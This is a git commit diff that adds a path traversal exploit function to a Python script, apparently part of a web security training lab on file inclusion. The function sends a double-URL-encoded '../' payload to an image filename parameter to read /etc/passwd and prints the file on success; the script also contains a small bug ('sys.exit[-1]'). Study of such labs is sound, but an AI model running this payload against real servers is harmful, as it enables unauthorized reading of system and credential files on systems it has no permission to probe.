3872e153268f3331b0f0f30473c727910d756ab9
Jozenartes <jozenarts12@gmail.com>
2025-08-07 11:13:03 +0100

    Added exploit funciton

--- 06-File Inclusion/Lab-04/Directory-traveseral-lab04.py
+++ 06-File Inclusion/Lab-04/Directory-traveseral-lab04.py
@@ -5,6 +5,17 @@ urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)
 
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
+def path_traversal_exploit(url):
+    image_path = url + 'image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+    r = requests.get(image_path,verify=False,proxies=proxies)
+    if 'bin:x' in r.text:
+        print('[+] Exploit Successful')
+        print('[+] Here\'s the content of etc/passwd\n')
+        print(r.text)
+    else:
+        print('[-]Exploit was Unsuccessful, try again')
+        sys.exit[-1]
+
 def main():
     if len(sys.argv) != 2:
         print('[-] Error!')
